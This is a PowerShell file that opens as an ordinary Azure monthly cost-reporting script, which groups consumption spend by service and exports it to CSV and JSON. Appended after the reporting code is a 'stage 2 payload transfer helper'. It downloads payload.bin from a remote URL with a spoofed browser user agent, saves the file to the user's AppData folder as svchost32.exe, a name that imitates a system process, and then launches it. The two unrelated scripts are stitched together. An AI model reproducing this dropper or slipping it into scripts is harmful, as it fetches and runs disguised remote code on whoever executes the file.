
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [double]$Threshold = 1000,
    [string]$Region = 'ap-southeast-2',
    [string]$ProfileName = "default",
    [Parameter(Mandatory = $false)]
    [string]$Month = "2025-06",

    [string]$Account = "150675414182",
    [string]$ReportPath = 'D:\Ops\finops\cost-azure-2025-06.csv',

    [string]$OutputPath = 'D:\Ops\finops\cost-azure-2025-06.json'
)

$InformationPreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$hostName = $env:COMPUTERNAME
$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
$groups = foreach ($line in $usage) {
    [pscustomobject]@{
        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
        Service = $line.ServiceName
        Amount  = [math]::Round([double]$line.PretaxCost, 2)
        Unit    = $line.Currency
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$topServices = $byService | Select-Object -First 5
$topServices | Format-Table -AutoSize
if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}

$byService | ConvertTo-Json -Depth 4 | Set-Content -Path $OutputPath -Encoding UTF8
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://contoso.com/downloads/payload.bin",
    [string]$WorkingPath = "$env:APPDATA\svchost32.exe",
    [int]$TransferTimeout = 23,
    [string]$BrowserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$StageResult = Invoke-PayloadFetch -SourceUrl $FetchUrl -DestinationPath $WorkingPath -TimeoutSec $TransferTimeout -UserAgent $BrowserAgent
if ($StageResult) {
    Start-Process -FilePath $WorkingPath
}

Start-Sleep -Seconds 17
$ProgressPreference = "SilentlyContinue"
